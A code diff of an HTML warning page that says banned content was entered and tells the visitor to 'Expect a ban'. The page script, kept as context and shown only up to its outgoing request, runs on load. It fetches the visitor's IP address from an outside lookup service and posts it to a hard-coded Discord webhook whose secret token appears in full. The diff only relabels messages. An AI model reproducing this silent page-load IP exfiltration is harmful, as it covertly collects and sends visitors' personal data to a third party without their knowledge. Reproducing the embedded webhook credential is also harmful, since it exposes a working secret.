@@ -41,19 +41,17 @@
   </style>
 </head>
 <body>
-  <h1>Klasky Csupo Detected</h1>
-  <p>Entering any klasky csupo related content has been denied.</p>
+  <h1>Warning</h1>
+  <p>Entering any rule breaking content has been denied.</p>
   <p>Expect a ban.</p>
   <script>
     const params = new URLSearchParams(window.location.search);
-    const reason = params.get('reason') || 'Unknown';
-    document.getElementById('reason').textContent = decodeURIComponent(reason);
 
     fetch("https://ipv4.icanhazip.com/t")
       .then(r => r.json())
       .then(data => {
         const ip = data.ip;
-        const payload = { content: `Logokid Detected: **${ip}**` };
+        const payload = { content: `Rule Broken: **${ip}**` };
         fetch("https://discord.com/api/webhooks/1427405408594563114/Nn8X1om_NDZqJ30DeYG2pdsX6saORVT0p4DGIxMQ41kMUnXQmebZkdLQbOKmW_viNPcE", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
